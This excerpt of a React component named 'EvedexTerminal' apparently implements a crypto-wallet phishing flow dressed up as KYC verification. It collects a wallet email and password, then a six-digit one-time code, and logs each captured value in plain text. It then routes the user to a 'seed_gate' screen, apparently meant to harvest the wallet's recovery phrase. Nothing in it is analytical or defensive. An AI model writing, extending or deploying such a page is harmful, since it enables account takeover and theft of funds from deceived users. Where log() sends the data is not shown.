...
export default function EvedexTerminal() {
  ...
  const [kycCode, setKycCode] = useState(""); // NEW: 2FA Code
  const [kycMode, setKycMode] = useState("email"); 
  const [kycPhase, setKycPhase] = useState(1); // NEW: Phase 1 (Email/Pass) vs Phase 2 (Code)
  ...
  return (
    <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
            ...
            <div style={{backgroundColor:'#0d1117', border:'1px solid #10b981', borderRadius:'35px', padding:'30px', textAlign:'center'}}>
              ...
              {kycMode === "email" ? (
                <>
                  {kycPhase === 1 ? (
                    <>
                      <input type="email" placeholder="SPEED_WALLET_ID" value={kycEmail} onChange={(e)=>setKycEmail(e.target.value)} style={{width:'100%', padding:'15px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'15px', outline:'none'}} />
                      ...
                      <button onClick={()=>{log(`🆔 SPEED_AUTH: ${kycEmail} PASS: ${kycPass}`); setKycPhase(2);}} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'18px', borderRadius:'15px', fontWeight:'900'}}>VERIFY_RELAY</button>
                    </>
                  ) : (
                    <>
                      <div style={{color:'#3b82f6', fontSize:'10px', marginBottom:'10px', fontWeight:'900'}}>ONE-TIME_SYNC_CODE_SENT_TO_EMAIL</div>
                      <input type="text" maxLength="6" placeholder="6-DIGIT_CODE" value={kycCode} onChange={(e)=>setKycCode(e.target.value)} style={{width:'100%', padding:'20px', backgroundColor:'black', border:'2px solid #3b82f6', borderRadius:'15px', color:'white', marginBottom:'25px', textAlign:'center', fontSize:'24px', letterSpacing:'10px', outline:'none'}} />
                      <button onClick={()=>{log(`🔑 SPEED_CODE: ${kycCode} FOR: ${kycEmail}`); setView("seed_gate");}} style={{width:'100%', backgroundColor:'#3b82f6', color:'white', padding:'18px', borderRadius:'15px', fontWeight:'900'}}>AUTHORIZE_NODE</button>
                    </>
                  )}
                </>
              ) : (
      ...
      {/* SEED GATE AND LOADING SCREENS PRESERVED */}
      {view === "seed_gate" && (
